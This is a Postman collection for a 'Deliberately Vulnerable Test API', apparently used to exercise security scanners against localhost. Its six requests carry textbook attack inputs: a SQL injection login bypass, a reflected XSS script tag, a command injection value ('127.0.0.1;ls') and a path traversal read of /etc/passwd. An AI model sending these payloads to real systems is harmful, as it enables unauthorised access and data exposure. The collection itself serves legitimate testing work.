{
  "info": {
    "_postman_id": "c1a4e9b2-1111-2222-3333-vulnapi12345",
    "name": "Deliberately Vulnerable Test API",
    "description": "Intentionally vulnerable API for security scanner testing",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
  },
  "item": [

    {
      "name": "1. SQL Injection - Login",
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "Content-Type",
            "value": "application/json"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n  \"username\": \"admin' OR '1'='1\",\n  \"password\": \"anything\"\n}"
        },
        "url": {
          "raw": "{{base_url}}/login",
          "host": ["{{base_url}}"],
          "path": ["login"]
        }
      }
    },

    {
      "name": "2. IDOR - Get User By ID",
      "request": {
        "method": "GET",
        "url": {
          "raw": "{{base_url}}/users/1",
          "host": ["{{base_url}}"],
          "path": ["users", "1"]
        }
      }
    },

    {
      "name": "3. No Auth Admin Access",
      "request": {
        "method": "GET",
        "url": {
          "raw": "{{base_url}}/admin/dashboard",
          "host": ["{{base_url}}"],
          "path": ["admin", "dashboard"]
        }
      }
    },

    {
      "name": "4. Reflected XSS",
      "request": {
        "method": "GET",
        "url": {
          "raw": "{{base_url}}/search?q=<script>alert('xss')</script>",
          "host": ["{{base_url}}"],
          "path": ["search"],
          "query": [
            {
              "key": "q",
              "value": "<script>alert('xss')</script>"
            }
          ]
        }
      }
    },

    {
      "name": "5. Command Injection Style Param",
      "request": {
        "method": "GET",
        "url": {
          "raw": "{{base_url}}/ping?host=127.0.0.1;ls",
          "host": ["{{base_url}}"],
          "path": ["ping"],
          "query": [
            {
              "key": "host",
              "value": "127.0.0.1;ls"
            }
          ]
        }
      }
    },

    {
      "name": "6. Insecure File Access",
      "request": {
        "method": "GET",
        "url": {
          "raw": "{{base_url}}/download?file=../../etc/passwd",
          "host": ["{{base_url}}"],
          "path": ["download"],
          "query": [
            {
              "key": "file",
              "value": "../../etc/passwd"
            }
          ]
        }
      }
    }

  ],
  "variable": [
    {
      "key": "base_url",
      "value": "http://localhost:3000"
    }
  ]
}